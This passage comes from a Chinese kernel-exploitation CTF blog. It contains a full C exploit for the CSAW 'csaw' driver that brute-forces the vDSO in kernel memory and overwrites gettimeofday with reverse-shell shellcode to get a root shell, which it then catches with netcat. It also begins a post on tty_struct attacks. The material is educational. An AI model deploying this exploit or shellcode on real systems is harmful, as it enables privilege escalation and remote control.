<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> offset = get_gettimeofday_str_offset();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">uint64_t</span> addr = <span class="number">0xffff880000000000</span>; addr&lt;<span class="number">0xffffc80000000000</span>; addr+=<span class="number">0x1000</span>) &#123;</span><br><span class="line">    RAA(fd,channel_id,read_buff,addr,<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(read_buff+offset,<span class="string">&quot;gettimeofday&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;%p found it?\n&quot;</span>, addr);</span><br><span class="line">        vdso_addr = addr;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：能劫持 vdso 的核心就是 vdso 在内核状态下是可写的，高版本内核就不可写了</li>
</ul>
<p>如果爆破出了 VDSO 的内核地址，就使用 GDB 把 VDSO 给 dump 下来，然后拖入 IDA 寻找函数 <code>gettimeofday</code> 的偏移（在 <code>get_gettimeofday_str_offset</code> 中查找的是 <code>gettimeofday</code> 字符串偏移）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vdso_addr in kernel: <span class="number">0xffff880001e04000</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; dump memory ./vdso.so <span class="number">0xffff880001e04000</span> <span class="number">0xffff880001e05000</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/10/08/cred%20attack+vdso%20attack/1665238227526.png" alt="1665238227526"> </p>
<p>写入的 Shellcode 是一个反弹 shell，它将 root shell 反弹到本地端口3333，我们只需 nc 本地端口3333即可 </p>
<ul>
<li>如果有 root 权限的程序，调用我们的 shellcode，那么我们的 shellcode 也是以 root 权限执行</li>
<li>在 Linux 中，crontab 是带有 root 权限的，并且它会不断的调用 vdso 里的 gettimeofday 函数</li>
<li>在 qemu 里，使用了一个程序来模拟（本题目是 <code>/sbin/init</code>）</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE     0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> buf_size;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">grow_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">loff_t</span> index;</span><br><span class="line">    <span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_gettimeofday_str_offset</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> vdso_addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line">    <span class="keyword">char</span>* name = <span class="string">&quot;gettimeofday&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!vdso_addr)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error get name&#x27;s offset&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;vdso_addr in user: 0x%lx\n&quot;</span>,vdso_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> name_addr = memmem(vdso_addr, <span class="number">0x1000</span>, name, <span class="built_in">strlen</span>(name));</span><br><span class="line">    <span class="keyword">if</span> (name_addr &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error get name&#x27;s offset&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> name_addr - vdso_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RAA</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> channel_id, <span class="keyword">void</span> *read_buff, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_channel</span>;</span></span><br><span class="line">    </span><br><span class="line">    seek_channel.id = channel_id;</span><br><span class="line">    seek_channel.index = addr<span class="number">-0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line">    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">    read_channel.id = channel_id;</span><br><span class="line">    read_channel.buf = (<span class="keyword">char</span>*)read_buff;</span><br><span class="line">    read_channel.count = len;</span><br><span class="line">    ioctl(fd, CSAW_READ_CHANNEL, &amp;read_channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WAA</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> channel_id, <span class="keyword">void</span>* write_buff, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_channel</span>;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">        seek_channel.id = channel_id;</span><br><span class="line">        seek_channel.index = addr<span class="number">-0x10</span>+i;</span><br><span class="line">        seek_channel.whence = SEEK_SET;</span><br><span class="line">        ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">        write_channel.id = channel_id;</span><br><span class="line">        write_channel.buf = (<span class="keyword">char</span>*)write_buff+i;</span><br><span class="line">        write_channel.count = <span class="number">1</span>;</span><br><span class="line">        ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_channel);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">channel_alloc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">channel_shrink</span>;</span></span><br><span class="line">    <span class="keyword">int</span> channel_id;</span><br><span class="line">    <span class="keyword">char</span> * read_buff = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">size_t</span> vdso_addr = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> shellcode[]=<span class="string">&quot;\x90\x53\x48\x31\xc0\xb0\x66\x0f\x05\x48\x31\xdb\x48\x39\xc3\x75\x0f\x48\x31\xc0\xb0\x39\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x09\x5b\x48\x31\xc0\xb0\x60\x0f\x05\xc3\x48\x31\xd2\x6a\x01\x5e\x6a\x02\x5f\x6a\x29\x58\x0f\x05\x48\x97\x50\x48\xb9\xfd\xff\xf2\xfa\x80\xff\xff\xfe\x48\xf7\xd1\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x07\x48\x31\xc0\xb0\xe7\x0f\x05\x90\x6a\x03\x5e\x6a\x21\x58\x48\xff\xce\x0f\x05\x75\xf6\x48\xbb\xd0\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xd3\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x0f\x05&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/csaw&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;open error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read_buff = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    channel_alloc.buf_size = <span class="number">0x100</span>;</span><br><span class="line">    channel_alloc.id = <span class="number">-1</span>;</span><br><span class="line">    ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;channel_alloc);</span><br><span class="line">    <span class="keyword">if</span>(channel_alloc.id == <span class="number">-1</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;alloc channel wrong&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;alloc channel id is :%d\n&quot;</span>,channel_alloc.id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    channel_id = channel_alloc.id;</span><br><span class="line">    channel_shrink.id = <span class="number">1</span>;</span><br><span class="line">    channel_shrink.size = <span class="number">0x101</span>;</span><br><span class="line">    ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;channel_shrink);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> offset = get_gettimeofday_str_offset();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lx\n&quot;</span>,offset);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint64_t</span> addr = <span class="number">0xffff880000000000</span>; addr&lt;<span class="number">0xffffc80000000000</span>; addr+=<span class="number">0x1000</span>) &#123;</span><br><span class="line">        RAA(fd,channel_id,read_buff,addr,<span class="number">0x1000</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(read_buff+offset,<span class="string">&quot;gettimeofday&quot;</span>)) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;%p found it?\n&quot;</span>, addr);</span><br><span class="line">            vdso_addr = addr;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(vdso_addr == <span class="number">-1</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;not find vdso&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;vdso_addr in kernel: 0x%lx\n&quot;</span>,vdso_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> gettimeofday = vdso_addr + <span class="number">0xcb0</span>;</span><br><span class="line">    WAA(fd,channel_id,shellcode,gettimeofday,<span class="built_in">strlen</span>(shellcode));</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;open a shell\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;nc -lvnp 3333&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>尝试了一下 “cred attack” 和 “vdso attack”</p>
<p>本来还想试试 “HijackPrctl”，但在 <code>qwb2018-solid_core</code> 中已经复现过了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/07/Linux%20tty%20%E7%AE%80%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/07/Linux%20tty%20%E7%AE%80%E6%9E%90/" class="post-title-link" itemprop="url">Linux tty 简析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-07 21:30:27 / Modified: 21:31:54" itemprop="dateCreated datePublished" datetime="2022-10-07T21:30:27+08:00">2022-10-07</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>tty_struct attack</strong></p>
<p>当用户打开 ptmx 驱动时 <code>open(&quot;/dev/ptmx&quot;, O_RDWR)</code> ，会分配一个 <code>tty_struct</code> 结构，它的结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span>	magic;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">	<span class="keyword">spinlock_t</span> ctrl_lock;</span><br><span class="line">	<span class="keyword">spinlock_t</span> flow_lock;</span><br><span class="line">	<span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>	<span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">64</span>];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>		<span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">	<span class="keyword">int</span> count;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>		<span class="comment">/* winsize_mutex */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> stopped:<span class="number">1</span>,	<span class="comment">/* flow_lock */</span></span><br><span class="line">		      flow_stopped:<span class="number">1</span>,</span><br><span class="line">		      unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">int</span> hw_stopped;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> ctrl_status:<span class="number">8</span>,	<span class="comment">/* ctrl_lock */</span></span><br><span class="line">		      packet:<span class="number">1</span>,</span><br><span class="line">		      unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> receive_room;	<span class="comment">/* Bytes free for queue */</span></span><br><span class="line">	<span class="keyword">int</span> flow_change;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">	<span class="keyword">wait_queue_head_t</span> write_wait;</span><br><span class="line">	<span class="keyword">wait_queue_head_t</span> read_wait;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *disc_data;</span><br><span class="line">	<span class="keyword">void</span> *driver_data;</span><br><span class="line">	<span class="keyword">spinlock_t</span> files_lock;		<span class="comment">/* protects tty_files list */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> closing;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;</span><br><span class="line">	<span class="keyword">int</span> write_cnt;</span><br><span class="line">	<span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p>其中有一个 <code>struct tty_operations</code> 指针，而 <code>tty_operations</code> 结构体里是一些列对驱动操作的函数指针：</p>
